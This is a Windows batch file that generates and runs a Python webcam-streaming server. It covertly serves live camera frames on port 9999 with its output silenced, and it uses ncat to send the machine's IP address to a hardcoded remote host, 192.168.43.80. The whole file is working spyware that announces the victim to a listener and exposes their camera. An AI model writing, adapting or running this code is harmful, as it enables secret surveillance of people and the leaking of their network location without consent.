@echo off
echo import socket, cv2, pickle, struct, imutils > script.py
echo server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) >> script.py
echo host_name = socket.gethostname() >> script.py
echo host_ip = socket.gethostbyname(host_name) >> script.py
echo # print('HOST IP:', host_ip) >> script.py
echo port = 9999 >> script.py
echo socket_address = (host_ip, port) >> script.py
echo invideo = 0 >> script.py
echo. >> script.py
echo server_socket.bind(socket_address) >> script.py
echo server_socket.listen(5) >> script.py
echo # print("LISTENING AT:", socket_address) >> script.py
echo. >> script.py
echo while True: >> script.py
echo     try: >> script.py
echo         client_socket, addr = server_socket.accept() >> script.py
echo         # print('GOT CONNECTION FROM:', addr) >> script.py
echo.        while True: >> script.py
echo             vid = cv2.VideoCapture(invideo) >> script.py
echo             while vid.isOpened(): >> script.py
echo                 img, frame = vid.read() >> script.py
echo                 frame = imutils.resize(frame, width=320) >> script.py
echo                 frame = cv2.flip(frame, 1) >> script.py
echo                 a = pickle.dumps(frame) >> script.py
echo                 message = struct.pack("Q", len(a)) + a >> script.py
echo                 client_socket.sendall(message) >> script.py
echo                 key = cv2.waitKey(1) >> script.py
echo                 if key == ord('q'): >> script.py
echo                     break >> script.py
echo.            vid.release() >> script.py
echo.            >> script.py
echo             # Menerima data untuk menghindari deadlock saat client mengakhiri koneksi >> script.py
echo             try: >> script.py
echo                 client_socket.settimeout(1) >> script.py
echo                 client_socket.recv(1) >> script.py
echo             except socket.timeout: >> script.py
echo                 pass >> script.py
echo.            client_socket.close() >> script.py
echo.            break >> script.py
echo.    except ConnectionResetError: >> script.py
echo         # print('Connection reset by peer') >> script.py
echo         continue >> script.py

setlocal enabledelayedexpansion

for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr /c:"IPv4 Address"') do (
    set "ip=%%a"
    set "ip=!ip:~1!"
)

echo %ip% | ncat 192.168.43.80 9999

python script.py
